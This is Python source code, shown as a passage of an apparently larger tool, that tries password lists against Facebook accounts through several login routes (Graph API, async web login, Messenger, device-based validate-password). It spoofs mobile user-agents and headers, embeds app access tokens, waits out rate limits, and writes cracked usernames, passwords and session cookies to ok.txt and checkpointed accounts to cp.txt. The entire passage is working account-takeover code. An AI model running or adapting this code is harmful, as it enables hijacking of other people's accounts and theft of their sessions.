Y81S;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/45904160;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2043;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/110.1.0.23.107;FBBV/378783593;FBDM/{density=3.0,width=1080,height=2161};FBLC/en_GB;FBRV/0;FBCR/Singtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2201;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=1200,height=1920};FBLC/en_US;FBRV/85070460;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T580;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_US;FBRV/85070460;FBCR/altice MEO;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5010;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/372.1.0.23.107;FBBV/378783593;FBDM/{density=3.0,width=1080,height=2161};FBLC/en_US;FBRV/0;FBCR/Singtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2249;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022666;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/condor;FBBD/condor;FBPN/com.facebook.katana;FBDV/PGN605;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/911.0.0.5.63;FBBV/4729936;FBDM/{density=1.0, width=768, height=1381};FBLC/en_GB;FBCR/Etisalat NG;FBMF/Oppo;FBBD/Oppo A16;FBPN/com.facebook.katana;FBDV/Oppo A16;FBSV/1.0;FBOP/31;FBCA/x86:armeabi-v7a;]"
                head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":username,"password":password,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"es_LA","client_country_code":"LA","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                xnxx = ses.post('https://b-graph.facebook.com/auth/login',data=data,headers=head)
                anjg = json.loads(xnxx.text)
               # prints(anjg)
                if "session_key" in xnxx.text:
                    kntl = self.memek(f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e")
                    cokz = ";".join(i["name"]+"="+i["value"] for i in anjg["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[bold green]{kntl[0]}|{kntl[1]}")
                        tree.add(f"[bold green]{coki}|{ua}[/]")
                        prints(tree)
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                    break
                elif "checkpoint" in xnxx.text:
                    mmks = self.memek(f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e")
                    tree = Tree("")
                    tree.add(f"[bold yellow]{mmks[0]}|{mmks[1]}")
                    prints(tree)
                    self.cp.append(mmks)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
                    prog.update(des, description=f"[*] [bold green]{xnxx.status_code}[/] method: [bold green]API[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[*] [bold green]{xnxx.status_code}[/] method: [bold green]API[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:exit(e)
        self.lo+=1
        prog.update(des, description=f"[*] method: [bold green]API[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
        prog.advance(des)

    def ASync(self, username, pasw):
        prog.update(des, description=f"[*] method: [bold green]ASYNC[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                rr = random.randint
                uas = self.ua_asu()
                ses = requests.Session()
                link = ses.get('https://x.facebook.com/login.php?skip_api_login=1&api_key=344107675684331&kid_directed_site=0&app_id=344107675684331&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.1%2Fdialog%2Foauth%3Fapp_id%3D344107675684331%26cbt%3D1690681903263%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1df963a6b5854%2526domain%253Did-id.soccermanager.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid-id.soccermanager.com%25252Ff2b0206cf592c6%2526relation%253Dopener%26client_id%3D344107675684331%26display%3Dtouch%26domain%3Did-id.soccermanager.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid-id.soccermanager.com%252Flogin.php%26locale%3Did_ID%26logger_id%3Df327a6cc180392c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df287916a688c5f8%2526domain%253Did-id.soccermanager.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid-id.soccermanager.com%25252Ff2b0206cf592c6%2526relation%253Dopener%2526frame%253Df1bfd7c0149d948%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.1%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df287916a688c5f8%26domain%3Did-id.soccermanager.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid-id.soccermanager.com%252Ff2b0206cf592c6%26relation%3Dopener%26frame%3Df1bfd7c0149d948%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
				"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
				"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
				"email": username,
				"prefill_contact_point": "",
				"prefill_source": "",
				"prefill_type": "",
				"first_prefill_source": "",
				"first_prefill_type": "",
				"had_cp_prefilled": "false",
				"had_password_prefilled": "true",
				"is_smart_lock": "true",
				"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
				"pass": password,
				"jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				"__dyn": "",
				"__csr": "",
				"__a": "",
				"user": "0",
				"_fb_noscript": "true"}
                head = {
				"Host": "x.facebook.com",
				"content-length": str(rr(2000,2199)),
				"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
				"sec-ch-ua-mobile": "?1",
				"user-agent": uas,
				"viewport-width": "557",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
				"x-asbd-id": "129477",
				"dpr": "1.29325",
				"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
				"sec-ch-ua-model": '"RMX3171"',
				"sec-ch-prefers-color-scheme": "dark",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://x.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://x.facebook.com/login.php?skip_api_login=1&api_key=482432758546335&kid_directed_site=0&app_id=482432758546335&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D482432758546335%26redirect_uri%3Dhttps%253A%252F%252Fapi.netdrive.net%252Faccounts%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%26response_type%3Dcode%26state%3D9imBv9D0gm6z%26auth_type%3Dreauthenticate%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1716d8aa-5ea4-45ad-9c36-ff6534ffb5cf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.netdrive.net%2Faccounts%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D9imBv9D0gm6z%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                post = ses.post(f"https://x.facebook.com/login/device-based/login/async/?api_key=482432758546335&auth_token=9a0dd463ee2801379b53fff8c630db87&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D482432758546335%26redirect_uri%3Dhttps%253A%252F%252Fapi.netdrive.net%252Faccounts%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%26response_type%3Dcode%26state%3D9imBv9D0gm6z%26auth_type%3Dreauthenticate%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1716d8aa-5ea4-45ad-9c36-ff6534ffb5cf%26tp%3Dunspecified&refsrc=deprecated&app_id=482432758546335&cancel=https%3A%2F%2Fapi.netdrive.net%2Faccounts%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D9imBv9D0gm6z%23_%3D_&lwv=100",data=data,headers=head,allow_redirects=False)

                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    kntl = self.memek(f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e")
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[bold green]{kntl[0]}|{kntl[1]}")
                        tree.add(f"[bold green]{coki}[/]")
                        prints(tree)
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    mmks = self.memek(f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e")
                    tree = Tree("")
                    tree.add(f"[bold yellow]{mmks[0]}|{mmks[1]}")
                    prints(tree)
                    self.cp.append(mmks)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                    break
            #except requests.exceptions.ConnectionError:
            #    prog.update(des, description=f"[*] method: [bold green]ASYNC[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
            #    prog.advance(des)
            #    time.sleep(5)
            except Exception as e:exit(e)
        self.lo+=1

    def messenger(self, username, pasw):
        prog.update(des, description=f"[*] method: [bold green]MESSENGER[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                cookies = {
                    'datr': 'C5WQZOg2MYh9mMIHd_w594Nc',
                    'dpr': '2',
                    'sb': '6cmXZKOHsuGk7UO8i2Gy7JX4',
                    'locale': 'id_ID',
                    'wd': '980x1715',
                }
                headers = {
                    'Host': 'www.messenger.com',
                    'cache-control': 'max-age=0',
                    'viewport-width': '980',
                    'sec-ch-ua': 'Google',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': 'Linux',
                    'sec-ch-ua-full-version-list': 'Google',
                    'sec-ch-prefers-color-scheme': 'light',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://www.messenger.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': self.ua_asu(),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.messenger.com/login/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5',
                }
                data = {
                    'jazoest': '2919',
                    'lsd': 'AVq7rWQr18c',
                    'initial_request_id': 'AASyEGHsnp3vC1oxvaMylNU',
                    'timezone': '-420',
                    'lgndim': 'eyJ3IjozNjAsImgiOjc2MCwiYXciOjM2MCwiYWgiOjc2MCwiYyI6MjR9',
                    'lgnrnd': '220257_J-BY',
                    'lgnjs': 'n',
                    'email': username,
                    'pass': password,
                    'login': '1',
                    'default_persistent': '',
                }
                xnxx = ses.post('https://www.messenger.com/login/password/', cookies=cookies, headers=headers, data=data)
                #print(json.dumps(xnxx.text))
                print(ses.cookies.get_dict())
                if "c_user" in ses.cookies.get_dict():
                    coki = ";".join([f"{kon}={tol}" for kon, tol in ses.cookies.items()])
                    kntl = self.memek(f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e")
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[bold green]{kntl[0]}|{kntl[1]}")
                        tree.add(f"[bold green]{coki}[/]")
                        prints(tree)
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                    break
                if "checkpoint_interstitial" in xnxx.text:
                    mmks = self.memek(f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e")
                    tree = Tree("")
                    tree.add(f"[bold yellow]{mmks[0]}|{mmks[1]}")
                    prints(tree)
                    self.cp.append(mmks)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[*] method: [bold green]MESSENGER[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:exit(e)
        self.lo+=1

    def validate(self, username, pasw):
        prog.update(des, description=f"[*] method: [bold green]VALIDATE[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas = self.ua_asu()
                head = {"Host": "m.facebook.com","content-length": "263","cache-control": "max-age=0",'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"upgrade-insecure-requests": '"1"',"origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                getlog = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={username}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={'lsd': re.search('name="lsd" value="(.*?)"',str(getlog.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(getlog.text)).group(1),'uid': username,'next': '','flow': 'login_no_pin','pass': password}
                ses.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    kntl = self.memek(f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e")
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[bold green]{kntl[0]}|{kntl[1]}")
                        tree.add(f"[bold green]{coki}[/]")
                        prints(tree)
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    mmks = self.memek(f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e")
                    tree = Tree("")
                    tree.add(f"[bold yellow]{mmks[0]}|{mmks[1]}")
                    prints(tree)
                    self.cp.append(mmks)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[*] method: [bold green]VALIDATE[/] OK:-[bold green]{len(self.ok)}[/] CP:-[bold yellow]{len(self.cp)}[/] - [bold red]{str(self.lo)}/{len(self.id)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:exit(e)
        self.lo+=1
"""
    def enc_pass(self, pw, link):
        teme = re.search('"__spin_t":(.*?),', str(link)).group(1)
        publ = re.search('{publicKey:"(.*?)",', str(link)).group(1)
        pubk = re.search('keyId:([0-9]+)', str(link)).group(1)
        rdb = RDM.get_random_bytes((len(auth1)-2)*2)
        dpt = AES.new(rdb, AES.MODE_GCM, nonce=bytes([0]*(len(auth1)-6)), mac_len=len(auth1)-2)
        dpt.update(str(teme).encode("utf-8"))
        epw, ctg = dpt.encrypt_and_digest(pw.encode("utf-8"))
        sld = SB(PK(binascii.unhexlify(str(publ)))).encrypt(rdb)
        ecp = base64.b64encode(bytes([1,int(pubk),*list(struct.pack('<h', len(sld))),*list(sld),*list(ctg),*list(epw)])).decode("utf-8")
        encp = '#PWD_BROWSER:%s:%s:%s'%(str(len(auth1)-13),teme,str(ecp))
        return encp
"""
os.system("clear")
Login().menu()
#Login().validate("", "ojeib")
